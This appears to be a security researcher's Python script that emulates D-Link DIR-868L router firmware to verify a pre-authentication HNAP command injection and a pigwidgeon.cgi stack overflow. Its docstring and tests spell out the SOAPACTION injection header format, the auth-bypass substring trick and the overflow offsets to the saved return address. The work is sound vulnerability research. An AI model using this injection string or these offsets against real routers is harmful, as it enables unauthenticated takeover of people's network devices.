#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Verification of the two remaining candidates in cgibin (DIR-868L B1 fw 2.01b05):

[A] HNAP pre-auth command injection (sub_1A57C, CVE-2015-2051 lineage)
    auth gate = strstr(SOAPACTION, ".../HNAP1/GetDeviceSettings")  -> substring!
    action    = strrchr(SOAPACTION, '/')+1  (trailing quote stripped)
    system("sh /var/run/<action>.sh > /dev/console")
    bypass+inject: SOAPACTION: "http://purenetworks.com/HNAP1/GetDeviceSettings/;CMD;"

[B] pigwidgeon.cgi post-auth stack overflow (sub_158F4, CVE-2013-6962 lineage)
    sprintf(v5[128], "%s\nACTION=SETCFG\nPREFIX=%s/%s", wand.php, "/runtime/session", uid_cookie)
    fixed prefix 61 bytes, uid cookie <=0x100 (getsid cap) -> up to 317 bytes
    predicted: saved R11 @ uid+107, saved LR @ uid+111 (v5 -> LR = 0xAC)
"""
import struct
from unicorn import *
from unicorn.arm_const import *

from verify_overflow import (Emu, cyclic, MAGIC_RET, STACK_BASE, STACK_SIZE)
from verify_gena import GenaEmu

STACK_TOP = STACK_BASE + STACK_SIZE - 0x10000
HNAP_MAIN   = 0x1A57C
PIGW_MAIN   = 0x158F4
HNAP_HMAC   = 0x19BB8     # sub_19BB8 cookie/HNAP_AUTH verify - must NOT be called
HNAP_LOCK   = 0x18A50     # sub_18A50 hnap.lock - stub to success
HNAP_PREP   = 0x1A4E8     # sub_1A4E8 phpcgi prep - stub
PIGW_AUTH   = 0x11450     # sub_11450 power check - stub to True (valid session)
PHP_EXEC    = 0x1E4C8     # sub_1E4C8 phpcgi exec - stub


class HnapEmu(GenaEmu):
    def __init__(self):
        super().__init__()
        uc = self.uc
        for addr, fn in ((HNAP_HMAC, self._flag), (HNAP_LOCK, self._one),
                         (HNAP_PREP, self._zero), (PHP_EXEC, self._zero),
                         (PIGW_AUTH, self._one)):
            uc.hook_add(UC_HOOK_CODE, fn, begin=addr, end=addr)
        self.hmac_called = False
        self.system_cmds = []

    def _flag(self, uc, addr, size, ud):
        self.hmac_called = True
        uc.reg_write(UC_ARM_REG_R0, 0)
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR) & ~1)

    def _one(self, uc, addr, size, ud):
        uc.reg_write(UC_ARM_REG_R0, 1)
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR) & ~1)

    def _zero(self, uc, addr, size, ud):
        uc.reg_write(UC_ARM_REG_R0, 0)
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR) & ~1)

    # capture system() instead of executing
    def h_stub(self, uc, addr, size, ud):
        name = self.plt_map[addr][0]
        R = lambda r: uc.reg_read(r)
        if name == 'system':
            self.system_cmds.append(self.cstr(uc.reg_read(UC_ARM_REG_R0)).decode('latin1'))
            uc.reg_write(UC_ARM_REG_R0, 0)
            lr = uc.reg_read(UC_ARM_REG_LR)
            cpsr = uc.reg_read(UC_ARM_REG_CPSR)
            uc.reg_write(UC_ARM_REG_CPSR, (cpsr | 0x20) if (lr & 1) else (cpsr & ~0x20))
            uc.reg_write(UC_ARM_REG_PC, lr & ~1)
            return
        if name == 'sleep':
            uc.reg_write(UC_ARM_REG_R0, 0)
            lr = uc.reg_read(UC_ARM_REG_LR)
            cpsr = uc.reg_read(UC_ARM_REG_CPSR)
            uc.reg_write(UC_ARM_REG_CPSR, (cpsr | 0x20) if (lr & 1) else (cpsr & ~0x20))
            uc.reg_write(UC_ARM_REG_PC, lr & ~1)
            return
        if name in ('open', 'fopen', 'opendir', 'unlink', 'remove', 'lockf',
                    'fgetc', 'fgets', 'fread', 'read', 'getline',
                    'fclose', 'close', 'rewind', 'fseek', 'ftell', 'fflush',
                    'fileno', 'getpid'):
            ret = {'fgetc': 0xFFFFFFFF, 'read': 0xFFFFFFFF, 'getpid': 1234,
                   'fileno': 3, 'lockf': 0}.get(name, 0)
            uc.reg_write(UC_ARM_REG_R0, ret)
            cpsr = uc.reg_read(UC_ARM_REG_CPSR)
            lr = uc.reg_read(UC_ARM_REG_LR)
            uc.reg_write(UC_ARM_REG_CPSR, (cpsr | 0x20) if (lr & 1) else (cpsr & ~0x20))
            uc.reg_write(UC_ARM_REG_PC, lr & ~1)
            return
        super().h_stub(uc, addr, size, ud)

    def run_at(self, entry, kv):
        self.env = {}
        self.place_env(kv)
        uc = self.uc
        uc.reg_write(UC_ARM_REG_CPSR, 0x000001F0)
        uc.reg_write(UC_ARM_REG_SP, STACK_TOP)
        uc.reg_write(UC_ARM_REG_R0, 0)
        uc.reg_write(UC_ARM_REG_R1, 0)
        uc.reg_write(UC_ARM_REG_R2, 0)
        uc.reg_write(UC_ARM_REG_LR, MAGIC_RET)
        self.stop_reason = None
        try:
            uc.emu_start(entry, 0, timeout=60_000_000)
        except UcError as e:
            if self.stop_reason is None:
                self.stop_reason = f"UcError: {e} at PC={uc.reg_read(UC_ARM_REG_PC):#010x}"
        return {'reason': self.stop_reason,
                'pc': uc.reg_read(UC_ARM_REG_PC),
                'r11': uc.reg_read(UC_ARM_REG_R11),
                'sp': uc.reg_read(UC_ARM_REG_SP)}


def test_hnap():
    print("=" * 78)
    print("[A] HNAP pre-auth injection - SOAPACTION bypass via GetDeviceSettings substring")
    print("=" * 78)
    e = HnapEmu()
    sa = b'"http://purenetworks.com/HNAP1/GetDeviceSettings/;usjsbCLImDiXsYwO;'   # marker cmd
    kv = {"REQUEST_METHOD": b"GET", "HTTP_SOAPACTION": sa,
          "REMOTE_ADDR": b"10.0.0.99"}
    r = e.run_at(HNAP_MAIN, kv)
    print(f"    stop : {r['reason']}")
    print(f"    HMAC verify (sub_19BB8) called : {e.hmac_called}   <- must be False")
    print(f"    system() calls                 : {e.system_cmds}")
    hit = any('usjsbCLImDiXsYwO' in c for c in e.system_cmds)
    print(f"    => {'INJECTION CONFIRMED - attacker command reached system() pre-auth' if hit else 'not reached - check flow'}")
    return hit and not e.hmac_called


def test_pigwidgeon():
    print()
    print("=" * 78)
    print("[B] pigwidgeon.cgi SETCFG overflow - uid cookie into sprintf(v5[128])")
    print("=" * 78)
    e2 = HnapEmu()
    pat = cyclic(200)                       # uid cookie (getsid cap = 256)
    kv = {"REQUEST_METHOD": b"GET",
          "REQUEST_URI": b"/pigwidgeon.cgi?ACTIONS=SETCFG",
          "QUERY_STRING": b"ACTIONS=SETCFG",
          "HTTP_COOKIE": b"uid=" + pat,
          "REMOTE_ADDR": b"10.0.0.99"}
    r = e2.run_at(PIGW_MAIN, kv)
    print(f"    stop : {r['reason']}")
    print(f"    PC   : {r['pc']:#010x}   R11: {r['r11']:#010x}")
    # locate v5 copy on stack: it starts with "/htdocs/webinc/wand.php\nACTION=SETCFG\nPREFIX=/runtime/session/"
    uc = e2.uc
    lo, hi = r['sp'] - 0x400, r['sp'] + 0x400
    data = bytes(uc.mem_read(lo, hi - lo))
    magic = b"/htdocs/webinc/wand.php"
    idx = data.find(magic)
    ok = False
    if idx >= 0:
        base = lo + idx
        # prefix 62 bytes, then uid copy; saved slots at v5+0xA8(R11)/0xAC(LR)
        for off, nm, pred in ((0xA8, 'saved R11', 106), (0xAC, 'saved LR', 110)):
            w = struct.unpack('<I', bytes(uc.mem_read(base + off, 4)))[0]
            m = struct.pack('<I', w) == pat[pred:pred + 4]
            print(f"    uid offset -> {nm} : {pred if m else -1} (empirical)  value {w:#010x}")
            ok = ok or m
        pc_b = struct.pack('<I', r['pc'] | 1)
        if pc_b == pat[110:114] or struct.pack('<I', r['pc']) == pat[110:114]:
            print("    PC popped from corrupted saved LR  ✓")
            ok = True
    else:
        print("    [!] sprintf output not found on stack")
    print(f"    => {'OVERFLOW CONFIRMED' if ok else 'check output'}")
    return ok


if __name__ == '__main__':
    a = test_hnap()
    b = test_pigwidgeon()
    print()
    print("=" * 78)
    print(f"VERDICT: HNAP injection={'CONFIRMED' if a else '??'}  pigwidgeon overflow={'CONFIRMED' if b else '??'}")
    print("=" * 78)
